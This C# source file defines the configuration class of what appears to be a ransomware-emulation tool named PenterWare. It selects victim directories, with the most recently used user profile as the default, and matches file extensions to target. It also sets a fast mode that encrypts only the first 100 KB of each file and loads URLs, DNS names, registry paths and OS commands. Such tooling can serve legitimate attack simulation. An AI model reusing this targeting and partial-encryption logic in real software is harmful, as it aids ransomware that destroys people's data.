using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace PenterWare.Utils;

internal class Policy
{
	protected static Policy PolicyInsance = null;

	public static int MaxBytesForEncryption;

	public static int FastEncryptionMaxBytes = 102400;

	protected static Regex PathSuffixRegex { get; private set; }

	public static List<string> InitialTargetPaths { get; private set; } = new List<string>();


	public static List<string> RegistryPaths { get; private set; } = new List<string>();


	public static List<string> Urls { get; private set; } = new List<string>();


	public static List<string> DNSs { get; private set; } = new List<string>();


	public static List<string> PathsToAccess { get; set; } = new List<string>();


	public static List<string> OsCommands { get; set; } = new List<string>();


	public static List<string> Strings { get; set; } = new List<string>();


	public static bool FastEncryptionMode { get; set; }

	public static string TargetUsername { get; set; }

	public static string BaseDirectory { get; set; }

	protected Policy()
	{
		SetPathSuffixRegex();
		SetInitialTargetPaths();
		SetRegistryPaths();
		SetUrls();
		SetDNSs();
	}

	public static Policy Get()
	{
		if (PolicyInsance == null)
		{
			PolicyInsance = new Policy();
		}
		return PolicyInsance;
	}

	public static void SetPathSuffixRegex()
	{
		PathSuffixRegex = new Regex("(" + Regex.Replace(ResourceData.PathSuffixesCommaSeparated, "\\s*,\\s*", "|") + ")$", RegexOptions.IgnoreCase);
	}

	public static void SetInitialTargetPaths()
	{
		if (ResourceData.TargetPathsCommaSeparated.Equals("%USERPROFILE%"))
		{
			DirectoryInfo directoryInfo = (from directory in new DirectoryInfo("C:\\Users").GetDirectories()
				orderby directory.LastWriteTime descending
				select directory).First();
			TargetUsername = directoryInfo.Name;
			BaseDirectory = directoryInfo.FullName;
			InitialTargetPaths.Add(directoryInfo.FullName);
			return;
		}
		string[] array = Regex.Split(ResourceData.TargetPathsCommaSeparated, "\\s*,\\s*");
		InitialTargetPaths.AddRange(array);
		string[] array2 = array;
		foreach (string text in array2)
		{
			Match match = Regex.Match(text, "Users\\\\(?'Username'.+?)\\\\");
			if (match.Success)
			{
				TargetUsername = match.Groups["Username"].Value;
				BaseDirectory = text;
				break;
			}
		}
		if (BaseDirectory == null)
		{
			BaseDirectory = array[0];
		}
	}

	public static void SetRegistryPaths()
	{
		RegistryPaths.AddRange(Regex.Split(ResourceData.RegistryPathsCommaSeparated, "\\s*,\\s*"));
	}

	public static void SetUrls()
	{
		Urls.AddRange(Regex.Split(ResourceData.UrlsCommaSeparated, "\\s*,\\s*"));
	}

	public static void SetDNSs()
	{
		DNSs.AddRange(Regex.Split(ResourceData.DNSsCommaSeparated, "\\s*,\\s*"));
	}

	public static void SetPathsToAccess()
	{
		PathsToAccess.AddRange(Regex.Split(ResourceData.PathsToAccessCommaSeperated, "\\s*,\\s*"));
	}

	public static void SetOsCommands()
	{
		OsCommands.AddRange(Regex.Split(ResourceData.OsCommands, "\\s*,\\s*"));
	}

	public static void SetStrings()
	{
		Strings.AddRange(Regex.Split(ResourceData.Strings, "\\s*,\\s*"));
	}

	public static void SetEncryptionMode()
	{
		FastEncryptionMode = ResourceData.FastEncryptionMode;
	}

	public static void SetMaxBytesForEncryption()
	{
		MaxBytesForEncryption = (FastEncryptionMode ? FastEncryptionMaxBytes : int.MaxValue);
	}

	public static bool IsFileExtensionInPolicy(string filePath)
	{
		if (File.Exists(filePath))
		{
			FileInfo fileInfo = new FileInfo(filePath);
			return PathSuffixRegex.IsMatch(fileInfo.Extension);
		}
		return false;
	}
}
